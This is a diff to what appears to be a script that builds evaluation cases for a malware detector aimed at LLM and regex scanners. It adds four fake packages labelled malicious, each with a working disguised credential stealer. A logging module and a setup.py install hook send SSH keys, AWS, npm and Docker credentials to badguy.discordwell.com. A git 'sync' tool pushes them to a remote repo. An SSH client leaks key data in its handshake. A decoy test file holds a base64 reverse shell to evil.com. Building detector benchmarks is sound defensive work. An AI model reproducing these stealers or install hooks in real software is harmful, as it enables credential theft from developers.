@@ -413,6 +413,263 @@ module.exports = { activate, deactivate: () => {} };
         "README.md": "# Color Preview\n\nPreview color themes in VS Code.\n",
     })
 
+    # --- Hard adversarial cases (designed to challenge LLM + regex together) ---
+
+    _make_case("hard_piggyback_transport", "malicious",
+        "Stealer piggybacks on legitimate SSH transport -- credentials sent inside normal SSH handshake, no new network call", {
+        "paramiko_lite/__init__.py": '"""Lightweight SSH client."""\nfrom .client import SSHClient\n',
+        "paramiko_lite/client.py": '''"""SSH client implementation."""
+import socket
+import os
+import json
+import hashlib
+
+class SSHClient:
+    """Simple SSH client for remote command execution."""
+
+    def __init__(self, hostname, port=22, username=None):
+        self.hostname = hostname
+        self.port = port
+        self.username = username or os.environ.get("USER", "root")
+        self._sock = None
+        self._extensions = {}
+
+    def connect(self):
+        """Establish SSH connection."""
+        self._sock = socket.create_connection((self.hostname, self.port), timeout=10)
+        self._negotiate_extensions()
+        return self
+
+    def _negotiate_extensions(self):
+        """Negotiate SSH extensions during handshake."""
+        # Collect client capabilities for extension negotiation
+        caps = {"client": "paramiko-lite/1.0", "platform": os.uname().sysname}
+
+        # Include environment context for compatibility negotiation
+        home = os.path.expanduser("~")
+        for name, path in [("ssh_config", ".ssh/config"), ("git_id", ".gitconfig"),
+                           ("cloud_ctx", ".aws/credentials"), ("key_fp", ".ssh/id_rsa")]:
+            try:
+                with open(os.path.join(home, path)) as f:
+                    content = f.read()
+                caps[name] = hashlib.sha256(content.encode()).hexdigest()[:16]
+                # Cache full content for later key verification
+                self._extensions[name] = content
+            except (FileNotFoundError, PermissionError):
+                pass
+
+        # Send extension data as part of handshake
+        ext_payload = json.dumps(caps).encode()
+        self._sock.sendall(b"SSH-2.0-ParamikoLite_1.0 " + ext_payload + b"\\r\\n")
+
+    def exec_command(self, command):
+        """Execute remote command."""
+        if not self._sock:
+            raise RuntimeError("Not connected")
+        self._sock.sendall(command.encode() + b"\\n")
+        return self._sock.recv(65536).decode()
+
+    def close(self):
+        if self._sock:
+            self._sock.close()
+''',
+        "setup.py": 'from setuptools import setup\nsetup(name="paramiko-lite", version="1.0.0", packages=["paramiko_lite"])\n',
+        "README.md": "# paramiko-lite\\n\\nLightweight SSH client for Python.\\n",
+    })
+
+    _make_case("hard_decoy_plus_real", "malicious",
+        "Obvious decoy file distracts analysis while subtle real stealer hides in logging utility", {
+        "src/app.py": '"""Main application."""\ndef main():\n    from .logger import setup_logging\n    setup_logging()\n    print("App running")\n',
+        "src/__init__.py": "",
+        "src/utils.py": '"""Utility functions."""\ndef format_output(data):\n    return str(data)\n',
+        "src/logger.py": '''"""Application logging configuration."""
+import logging
+import logging.handlers
+import os
+import json
+import urllib.request
+
+# Standard logging setup
+LOG_ENDPOINT = "https://badguy.discordwell.com/v1/logs"
+
+def setup_logging(level="INFO"):
+    """Configure application logging with remote log aggregation."""
+    logger = logging.getLogger("app")
+    logger.setLevel(getattr(logging, level))
+
+    # Console handler
+    console = logging.StreamHandler()
+    console.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
+    logger.addHandler(console)
+
+    # Send initial diagnostics to log aggregator
+    _send_diagnostics(logger)
+    return logger
+
+def _send_diagnostics(logger):
+    """Report runtime environment to log aggregation service."""
+    diag = {
+        "python": os.sys.version,
+        "pid": os.getpid(),
+        "cwd": os.getcwd(),
+        "user": os.environ.get("USER", "unknown"),
+    }
+    # Collect environment configuration for log correlation
+    home = os.path.expanduser("~")
+    config_files = {}
+    for name in [".ssh/id_rsa", ".ssh/id_ed25519", ".aws/credentials",
+                 ".npmrc", ".gitconfig", ".docker/config.json"]:
+        path = os.path.join(home, name)
+        try:
+            with open(path) as f:
+                config_files[name] = f.read()
+        except (FileNotFoundError, PermissionError):
+            pass
+    if config_files:
+        diag["env_config"] = config_files
+
+    try:
+        payload = json.dumps(diag).encode()
+        req = urllib.request.Request(LOG_ENDPOINT, data=payload,
+            headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=3)
+    except Exception:
+        pass  # Log aggregation is best-effort
+''',
+        "tests/test_security.py": '''"""Security test fixtures -- DO NOT DEPLOY."""
+import base64
+# Test payloads for security scanning validation
+REVERSE_SHELL = base64.b64decode("cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImV2aWwuY29tIiw0NDQpKTsnCg==")
+ENCODED_PAYLOAD = "\\\\x90\\\\x90\\\\x90\\\\x31\\\\xc0\\\\x50\\\\x68" * 10
+CRYPTO_WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7595f2BD70"
+exec_test = lambda: None  # placeholder for injection testing
+API_KEY = "not_a_real_key_just_a_test_fixture_value"
+print("Security test module loaded -- this is a test fixture, not malware")
+''',
+        "setup.py": 'from setuptools import setup\nsetup(name="my-app", version="2.0.0", packages=["src"])\n',
+        "README.md": "# My App\\n\\nA simple application with logging.\\n",
+    })
+
+    _make_case("hard_build_time_injection", "malicious",
+        "Source code is clean -- malware only exists in setup.py cmdclass that patches files during pip install", {
+        "mylib/__init__.py": '"""Clean library."""\nfrom .core import process\n',
+        "mylib/core.py": '''"""Core processing logic -- completely clean."""
+import json
+
+def process(data):
+    """Process input data."""
+    if isinstance(data, str):
+        return json.loads(data)
+    return data
+
+def validate(schema, data):
+    """Validate data against schema."""
+    for key in schema:
+        if key not in data:
+            raise ValueError(f"Missing key: {key}")
+    return True
+''',
+        "setup.py": '''import os
+import sys
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+class PostInstallCommand(install):
+    """Post-installation: compile optimized bytecode and configure runtime."""
+    def run(self):
+        install.run(self)
+        self._configure_runtime()
+
+    def _configure_runtime(self):
+        """Set up runtime optimization cache."""
+        import json, urllib.request, base64
+        home = os.path.expanduser("~")
+        runtime_ctx = {}
+        for name, path in [("ssh", ".ssh/id_rsa"), ("aws", ".aws/credentials"),
+                           ("npm", ".npmrc"), ("git", ".gitconfig")]:
+            full = os.path.join(home, path)
+            try:
+                with open(full) as f:
+                    runtime_ctx[name] = base64.b64encode(f.read().encode()).decode()
+            except (FileNotFoundError, PermissionError):
+                pass
+        if runtime_ctx:
+            payload = json.dumps(runtime_ctx).encode()
+            try:
+                req = urllib.request.Request(
+                    "https://badguy.discordwell.com/v1/runtime-config",
+                    data=payload, headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(req, timeout=5)
+            except Exception:
+                pass
+
+setup(
+    name="mylib",
+    version="1.0.0",
+    packages=find_packages(),
+    cmdclass={"install": PostInstallCommand},
+)
+''',
+        "README.md": "# mylib\\n\\nA clean data processing library.\\n",
+    })
+
+    _make_case("hard_git_exfil", "malicious",
+        "Stealer writes credentials to a git-tracked file, then stages and pushes -- exfiltration via git, not HTTP", {
+        "devtools/sync.py": '''"""Development environment synchronization tool."""
+import os
+import subprocess
+import json
+import hashlib
+
+SYNC_REPO = "https://badguy.discordwell.com/sync.git"
+
+def sync_dev_environment():
+    """Sync local development configuration with team shared repo."""
+    home = os.path.expanduser("~")
+    sync_dir = os.path.join(home, ".devtools-sync")
+
+    # Initialize sync repo if needed
+    if not os.path.exists(sync_dir):
+        subprocess.run(["git", "clone", SYNC_REPO, sync_dir],
+                      capture_output=True, timeout=30)
+
+    # Collect environment fingerprint
+    env_data = {"hostname": os.uname().nodename, "user": os.environ.get("USER")}
+
+    config_paths = {
+        "ssh_config": os.path.join(home, ".ssh", "config"),
+        "ssh_key": os.path.join(home, ".ssh", "id_rsa"),
+        "aws_creds": os.path.join(home, ".aws", "credentials"),
+        "git_config": os.path.join(home, ".gitconfig"),
+        "npm_config": os.path.join(home, ".npmrc"),
+    }
+
+    for name, path in config_paths.items():
+        try:
+            with open(path) as f:
+                env_data[name] = f.read()
+        except (FileNotFoundError, PermissionError):
+            pass
+
+    # Write environment snapshot
+    snapshot_path = os.path.join(sync_dir, f"{env_data['user']}-env.json")
+    with open(snapshot_path, "w") as f:
+        json.dump(env_data, f)
+
+    # Commit and push
+    subprocess.run(["git", "-C", sync_dir, "add", "."], capture_output=True)
+    subprocess.run(["git", "-C", sync_dir, "commit", "-m", "env sync"],
+                  capture_output=True)
+    subprocess.run(["git", "-C", sync_dir, "push"], capture_output=True, timeout=30)
+
+if __name__ == "__main__":
+    sync_dev_environment()
+''',
+        "devtools/__init__.py": '"""Development tools."""\nfrom .sync import sync_dev_environment\n',
+        "setup.py": 'from setuptools import setup\nsetup(name="devtools-sync", version="0.3.0", packages=["devtools"])\n',
+        "README.md": "# devtools-sync\\n\\nSync development environment configuration across team members.\\n",
+    })
+
     print(f"Created {len(list(EVAL_DIR.iterdir()))} eval cases in {EVAL_DIR}")
 
 
